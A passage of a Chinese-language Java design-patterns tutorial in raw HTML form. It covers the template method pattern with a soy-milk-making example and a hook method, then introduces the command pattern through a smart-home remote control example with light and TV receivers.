&#125;<br>   <br>   <span class="hljs-comment">//添加不同的配料， 抽象方法, 子类具体实现</span><br>   <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//浸泡</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">soak</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;第三步， 黄豆和配料开始浸泡， 需要3小时 &quot;</span>);<br>   &#125;<br>    <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">beat</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;第四步：黄豆和配料放到豆浆机去打碎  &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">----</span><span class="hljs-comment">制作红豆豆浆</span><span class="hljs-literal">----</span><br><span class="hljs-comment">第一步：选择好的新鲜黄豆</span>  <br> <span class="hljs-comment">加入上好的红豆</span> <br><span class="hljs-comment">第三步， 黄豆和配料开始浸泡， 需要3小时</span> <br><span class="hljs-comment">第四步：黄豆和配料放到豆浆机去打碎</span>  <br><span class="hljs-literal">----</span><span class="hljs-comment">制作花生豆浆</span><span class="hljs-literal">----</span><br><span class="hljs-comment">第一步：选择好的新鲜黄豆</span>  <br> <span class="hljs-comment">加入上好的花生</span> <br><span class="hljs-comment">第三步， 黄豆和配料开始浸泡， 需要3小时</span> <br><span class="hljs-comment">第四步：黄豆和配料放到豆浆机去打碎</span> <br></code></pre></td></tr></table></figure><h3 id="模板方法模式的钩子方法"><a class="markdownIt-Anchor" href="#模板方法模式的钩子方法"></a> 模板方法模式的钩子方法</h3><ol><li><p>在模板方法模式的<strong>父类</strong>中，我们可以<strong>定义一个方法</strong>，它<strong>默认不做任何事</strong>，子类可以视情况要不要覆盖它，该方法称为“钩子”。</p></li><li><p>还是用上面做豆浆的例子来讲解，比如，我们还希望<strong>制作纯豆浆</strong>，<strong>不添加任何的配料</strong>，请使用钩子方法对前面的模板方法进行改造</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103151439028.png" alt="image-20230103151439028" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//制作红豆豆浆</span><br>      <br>      System.out.println(<span class="hljs-string">&quot;----制作红豆豆浆----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">redBeanSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedBeanSoyaMilk</span>();<br>      redBeanSoyaMilk.make();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----制作花生豆浆----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">peanutSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PeanutSoyaMilk</span>();<br>      peanutSoyaMilk.make();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----制作纯豆浆----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">pureSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PureSoyaMilk</span>();<br>      pureSoyaMilk.make();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PeanutSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PeanutSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 加入上好的花生 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PureSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PureSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//空实现</span><br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-type">boolean</span> <span class="hljs-title function_">customerWantCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p><code>RedBeanSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedBeanSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 加入上好的红豆 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-comment">//抽象类，表示豆浆</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-comment">//模板方法, make , 模板方法可以做成final , 不让子类去覆盖.</span><br>   <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">make</span><span class="hljs-params">()</span> &#123;<br>      <br>      select(); <br>      <span class="hljs-keyword">if</span>(customerWantCondiments()) &#123;<br>         addCondiments();<br>      &#125;<br>      soak();<br>      beat();<br>      <br>   &#125;<br>   <br>   <span class="hljs-comment">//选材料</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;第一步：选择好的新鲜黄豆  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//添加不同的配料， 抽象方法, 子类具体实现</span><br>   <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//浸泡</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">soak</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;第三步， 黄豆和配料开始浸泡， 需要3小时 &quot;</span>);<br>   &#125;<br>    <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">beat</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;第四步：黄豆和配料放到豆浆机去打碎  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//钩子方法，决定是否需要添加配料</span><br>   <span class="hljs-type">boolean</span> <span class="hljs-title function_">customerWantCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">----</span><span class="hljs-comment">制作红豆豆浆</span><span class="hljs-literal">----</span><br><span class="hljs-comment">第一步：选择好的新鲜黄豆</span>  <br> <span class="hljs-comment">加入上好的红豆</span> <br><span class="hljs-comment">第三步， 黄豆和配料开始浸泡， 需要3小时</span> <br><span class="hljs-comment">第四步：黄豆和配料放到豆浆机去打碎</span>  <br><span class="hljs-literal">----</span><span class="hljs-comment">制作花生豆浆</span><span class="hljs-literal">----</span><br><span class="hljs-comment">第一步：选择好的新鲜黄豆</span>  <br> <span class="hljs-comment">加入上好的花生</span> <br><span class="hljs-comment">第三步， 黄豆和配料开始浸泡， 需要3小时</span> <br><span class="hljs-comment">第四步：黄豆和配料放到豆浆机去打碎</span>  <br><span class="hljs-literal">----</span><span class="hljs-comment">制作纯豆浆</span><span class="hljs-literal">----</span><br><span class="hljs-comment">第一步：选择好的新鲜黄豆</span>  <br><span class="hljs-comment">第三步， 黄豆和配料开始浸泡， 需要3小时</span> <br><span class="hljs-comment">第四步：黄豆和配料放到豆浆机去打碎</span> <br></code></pre></td></tr></table></figure><h2 id="模板方法模式的注意事项和细节"><a class="markdownIt-Anchor" href="#模板方法模式的注意事项和细节"></a> 模板方法模式的注意事项和细节</h2><ol><li><p>基本思想是：算法只存在于一个地方，也就是在父类中，容易修改。需要修改算法时，只要修改父类的模板方法或者已经实现的某些步骤，子类就会继承这些修改</p></li><li><p>实现了最大化代码复用。父类的模板方法和已实现的某些步骤会被子类继承而直接使用。</p></li><li><p>既统一了算法，也提供了很大的灵活性。父类的模板方法确保了算法的结构保持不变，同时由子类提供部分步骤的实现。</p></li><li><p>该模式的不足之处：每一个不同的实现都需要一个子类实现，导致类的个数增加，使得系统更加庞大</p></li><li><p>一般模板方法都加上 final 关键字， 防止子类重写模板方法.</p></li><li><p>模板方法模式使用场景：当要完成在某个过程，该过程要执行一系列步骤 ，这一系列的步骤基本相同，但其个别步骤在实现时 可能不同，通常考虑用模板方法模式来处理</p></li></ol><h1 id="命令模式"><a class="markdownIt-Anchor" href="#命令模式"></a> 命令模式</h1><p>命令模式（CommandPattern）是一种数据驱动的设计模式，它属于行为型模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。</p><h2 id="介绍-13"><a class="markdownIt-Anchor" href="#介绍-13"></a> 介绍</h2><p><strong>意图：</strong> 将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化。</p><p><strong>主要解决：</strong><br />在软件系统中，行为请求者与行为实现者通常是一种紧耦合的关系，但某些场合，比如需要对行为进行记录、撤销或重做、事务等处理时，这种无法抵御变化的紧耦合的设计就不太合适。</p><p><strong>何时使用：</strong><br />在某些场合，比如要对行为进行&quot;记录、撤销/重做、事务&quot;等处理，这种无法抵御变化的紧耦合是不合适的。在这种情况下，如何将&quot;行为请求者&quot;与&quot;行为实现者&quot;解耦？将一组行为抽象为对象，可以实现二者之间的松耦合。</p><p><strong>如何解决：</strong> 通过调用者调用接受者执行命令，顺序：调用者→命令→接受者。</p><p><strong>关键代码：</strong> 定义三个角色：1、received 真正的命令执行对象 2、Command 3、invoker 使用命令对象的入口</p><p><strong>应用实例：</strong> struts 1 中的 action 核心控制器 ActionServlet 只有一个，相当于<br />Invoker，而模型层的类会随着不同的应用有不同的模型类，相当于具体的 Command。</p><p><strong>优点：</strong> 1、降低了系统耦合度。 2、新的命令可以很容易添加到系统中去。</p><p><strong>缺点：</strong> 使用命令模式可能会导致某些系统有过多的具体命令类。</p><p><strong>使用场景：</strong> 认为是命令的地方都可以使用命令模式，比如： 1、GUI 中每一个按钮都是一条命令。 2、模拟 CMD。</p><p><strong>注意事项：</strong> 系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作，也可以考虑使用命令模式，见命令模式的扩展。</p><p>命令模式结构示意图:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/commanduml.jpg" alt="" /></p><p>对原理类图的说明-即(命名模式的角色及职责)</p><ol><li><p>Invoker 是调用者角色</p></li><li><p>Command: 是命令角色，需要执行的所有命令都在这里，可以是接口或抽象类</p></li><li><p>Receiver: 接受者角色，知道如何实施和执行一个请求相关的操作</p></li><li><p>ConcreteCommand: 将一个接受者对象与一个动作绑定，调用接受者相应的操作，实现 execute</p></li></ol><h2 id="实现-11"><a class="markdownIt-Anchor" href="#实现-11"></a> 实现</h2><p>智能生活项目需求</p><p>看一个具体的需求</p><ol><li><p>我们买了一套智能家电，有照明灯、风扇、冰箱、洗衣机，我们只要在手机上安装 app 就可以控制对这些家电工作。</p></li><li><p>这些智能家电来自不同的厂家，我们不想针对每一种家电都安装一个 App，分别控制，我们希望只要一个 app就可以控制全部智能家电。</p></li><li><p>要实现一个 app 控制所有智能家电的需要，则每个智能家电厂家都要提供一个统一的接口给 app 调用，这时 就可以考虑使用命令模式。</p></li><li><p>命令模式可将“动作的请求者”从“动作的执行者”对象中解耦出来.</p></li><li><p>在我们的例子中，动作的请求者是手机 app，动作的执行者是每个厂商的一个家电产品</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103163835693.png" alt="image-20230103163835693" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>      <span class="hljs-comment">//使用命令设计模式，完成通过遥控器，对电灯的操作</span><br>      <br>      <span class="hljs-comment">//创建电灯的对象(接受者)</span><br>      <span class="hljs-type">LightReceiver</span> <span class="hljs-variable">lightReceiver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LightReceiver</span>();<br>      <br>      <span class="hljs-comment">//创建电灯相关的开关命令</span><br>      <span class="hljs-type">LightOnCommand</span> <span class="hljs-variable">lightOnCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LightOnCommand</span>(lightReceiver);<br>      <span class="hljs-type">LightOffCommand</span> <span class="hljs-variable">lightOffCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LightOffCommand</span>(lightReceiver);<br>      <br>      <span class="hljs-comment">//需要一个遥控器</span><br>      <span class="hljs-type">RemoteController</span> <span class="hljs-variable">remoteController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteController</span>();<br>      <br>      <span class="hljs-comment">//给我们的遥控器设置命令, 比如 no = 0 是电灯的开和关的操作</span><br>      remoteController.setCommand(<span class="hljs-number">0</span>, lightOnCommand, lightOffCommand);<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------按下灯的开按钮-----------&quot;</span>);<br>      remoteController.onButtonWasPushed(<span class="hljs-number">0</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------按下灯的关按钮-----------&quot;</span>);<br>      remoteController.offButtonWasPushed(<span class="hljs-number">0</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------按下撤销按钮-----------&quot;</span>);<br>      remoteController.undoButtonWasPushed();<br>      <br>      <br>      System.out.println(<span class="hljs-string">&quot;=========使用遥控器操作电视机==========&quot;</span>);<br>      <br>      <span class="hljs-type">TVReceiver</span> <span class="hljs-variable">tvReceiver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TVReceiver</span>();<br>      <br>      <span class="hljs-type">TVOffCommand</span> <span class="hljs-variable">tvOffCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TVOffCommand</span>(tvReceiver);<br>      <span class="hljs-type">TVOnCommand</span> <span class="hljs-variable">tvOnCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TVOnCommand</span>(tvReceiver);<br>      <br>      <span class="hljs-comment">//给我们的遥控器设置命令, 比如 no = 1 是电视机的开和关的操作</span><br>      remoteController.setCommand(<span class="hljs-number">1</span>, tvOnCommand, tvOffCommand);<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------按下电视机的开按钮-----------&quot;</span>);<br>      remoteController.onButtonWasPushed(<span class="hljs-number">1</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------按下电视机的关按钮-----------&quot;</span>);<br>      remoteController.offButtonWasPushed(<span class="hljs-number">1</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------按下撤销按钮-----------&quot;</span>);<br>      remoteController.undoButtonWasPushed();<br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Command.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><br><span class="hljs-comment">//创建命令接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">//执行动作(操作)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span>;<br>   <span class="hljs-comment">//撤销动作(操作)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LightOffCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LightOffCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">// 聚合LightReceiver</span><br><br>   LightReceiver light;<br><br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">LightOffCommand</span><span class="hljs-params">(LightReceiver light)</span> &#123;<br>         <span class="hljs-built_in">super</span>();<br>         <span class="hljs-built_in">this</span>.light = light;<br>      &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 调用接收者的方法</span><br>      light.off();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 调用接收者的方法</span><br>      light.on();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LightOnCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LightOnCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">//聚合LightReceiver</span><br>   <br>   LightReceiver light;<br>   <br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">LightOnCommand</span><span class="hljs-params">(LightReceiver light)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.light = light;<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//调用接收者的方法</span><br>      light.on();<br>   &#125;<br><br>   <br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//调用接收者的方法</span><br>      light.off();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>LightReceiver.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LightReceiver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 电灯打开了.. &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 电灯关闭了.. &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>NoCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 没有任何命令，即空执行: 用于初始化每个按钮, 当调用空命令时，对象什么都不做</span><br><span class="hljs-comment"> * 其实，这样是一种设计模式, 可以省掉对空判断</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span 